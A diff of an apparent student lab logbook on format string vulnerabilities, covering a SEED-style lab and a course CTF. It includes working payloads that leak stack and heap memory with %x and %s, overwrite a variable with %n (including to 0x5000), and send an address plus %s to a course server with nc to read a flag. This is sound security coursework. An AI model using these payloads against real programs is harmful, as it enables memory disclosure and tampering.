@@ -20,8 +20,11 @@ The task is to input to the server, such that when the server program tries to p
 
 We managed to Successfully crash the program by sending the "%s" string format specifier.
 Using the following command:
+
 ![Alt text](/Logbooks/img/Week7/task1_1.png)
+
 We got the following server message: (No smiley faces == program crash)
+
 ![Alt text](/Logbooks/img/Week7/task1_2.png)
 
 ## Task 2:  Printing Out the Server Program’s Memory
@@ -31,23 +34,76 @@ We got the following server message: (No smiley faces == program crash)
 The goal is to print out the data on the stack. For that we will use the "%x" format specifier joined with a character sequence 'ABCD' that's easy to find when the memory is printed. (Should appear as 44434241)
 
 Using the following command:
+
 ![Alt text](/Logbooks/img/Week7/task2A_1.png)
+
 We got the following server message:
+
 ![Alt text](/Logbooks/img/Week7/task2A_2.png)
 
 The stack is found after 64 characters or 256 bytes.
 
+
 ### Task 2.B: Heap Data
 
+Once the initial 4-byte location of our input is identified, acquiring the secret message involves appending the address of the secret message (`\x08\x40\x0b\x08`) to the string, along with a specific number of %x instances to navigate to the precise position in the stack. Subsequently, incorporating %s ensures the printing of the value stored at that memory address, as illustrated below:
+
+```
+$ string = "\x08\x40\x0b\x08%x"*63 + "%s\n"
+```
+
+Using that string, this is the secret message obtained:
+
+```
+11223344 1000 8049db5 80e5320 80e61c0 ffff05d0 ffff04f8 80e62d4 80e5000 
+ffff0598 8049f7e ffff05d0 0 64 8049f47 80e5320 518 ffff0694 ffff05d0 
+80e5320 8bb3720 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 a35c6c00
+80e5000 80e5000 ffff0bb8 8049eff ffff05d0 c4 5dc 80e5320 0 0 0 ffff0c84 0
+0 0 c4 A secret message
+```
 
 
 ## Task 3:  Modifying the Server Program’s Memory
 
+The objective of this task is to modify the value of the target variable that is defined in the server program.
+
 ### Task 3.A: Change the value to a different value.
+
+In this sub-task, we need to change the content of
+the target variable to something else.
+
+To alter the target value, we apply the identical logic used for revealing the secret message. Initially, we convert the target address to Little-Endian and employ a specific number of %x, as previously demonstrated. The key distinction is that instead of seeking to display the string using %s, the objective now is to manipulate the value by substituting %s with %n.
+Like so:
+
+```
+$ string = "\x68\x50\x0e\x08%x"*63 + "%n\n"
+```
+
+Using that string on the program, we change the initial value of `target`(0x1122334) to 0x00000ee:
+
+```
+The target variable's value (before): 0x1122334
+The target variable's value (after):  0x00000ee
+```
 
 ### Task 3.B: Change the value to 0x5000.
 
+In this sub-task, we need to change the content of the
+target variable to a specific value 0x5000.
 
+Having gained the ability to write to the target, our next step was to insert the appropriate number of characters into the string, ensuring that the count of characters preceding the %n value equaled 0x5000 (20480 in decimal). Upon conversion, we determined that 20480 characters were needed before the 'n' specifier.
+
+To achieve the goal of printing 0x5000 (20480 in decimal), each %x call required a precision of 325 (20480 / 63 ~= 325) characters. This precision would result in a value just shy of 20480 (325 * 63 + 4, accounting for the initial 4 bytes of the string, equals 20479). Consequently, an additional character ('a') was inserted before the %n call to compensate for the shortfall.
+With this, this was our string:
+
+```
+$ string = "\x68\x50\x0e\x08%325x"*63  + "a%n\n"
+```
+
+Using it, we obtained this:
+```
+The target variable's value (after):  0x00005000
+```
 
 # CTF - Control The Flag
 
@@ -132,9 +188,11 @@ p.interactive()
 ```
 
 4. Running the exploit, this is the output:
+
 ![scriptRun](/Logbooks/img/Week7/scriptRun.png)
 
 5. Successfully observing the stack, we retrieved the address of the `flag` variable by running the gdb program:
+
 ![flagAddress]/Logbooks/img/Week7/flagAddress.png()
 
 6. Obtaining this value, since the output of our program is right at the beginning of the stack, we converted it to little endian followed by a `%s` to read the value of the previously mentioned address (the address of the `flag` variable). With this, we assigned this value as input to the function running on the server `ctf-fsi.fe.up.pt 4004`:
@@ -144,6 +202,7 @@ $ echo -e '\x60\xc0\x04\x08%s' | nc ctf-fsi.fe.up.pt 4004
 ```
 
 7. We obtained the flag:
+
 ![flagChallenge1](/Logbooks/img/Week7/flagDesafio1.png)
 
 
@@ -159,6 +218,7 @@ $ echo -e '\x60\xc0\x04\x08%s' | nc ctf-fsi.fe.up.pt 4004
     - Since the `Format String` vulnerability allows altering the value of variables, it is possible to change the value of `key` to be equal to **0xbeef**.
 
 1. We ran the gdb program to discover the address of the `key` variable:
+
 ![keyAddress]()
 
 2. Since we want the `key` variable to have the value **0xbeef**, which corresponds to **48879** in decimal, we need to print 48879 characters and then call `%n`.
